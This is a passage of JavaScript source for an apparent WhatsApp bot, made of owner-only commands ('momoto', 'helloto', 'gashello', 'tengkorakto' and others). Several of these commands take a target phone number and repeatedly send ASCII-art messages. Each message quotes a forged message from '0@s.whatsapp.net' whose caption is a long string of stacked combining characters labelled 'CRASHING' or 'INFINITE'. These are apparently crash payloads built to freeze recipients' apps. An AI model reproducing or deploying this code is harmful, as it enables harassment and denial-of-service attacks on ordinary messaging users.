                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    m.reply(`SUCCES`)
                     }
                break
          case 'momo': {            
          if (!isCreator) return
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
          case 'momoto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
          case 'gasmomo': {            
          if (!isCreator) return
           if (!text) throw `Nomernya mana?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
case 'hello': {            
          if (!isCreator) return
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'helloto': {            
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'gashello': {            
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'tengkorak': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'tengkorakto': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)
await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:teng},{quoted:asukonyol11})
            await sleep(30000)}
            break
case 'gastengkorak': {            
          if (!isCreator) return
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
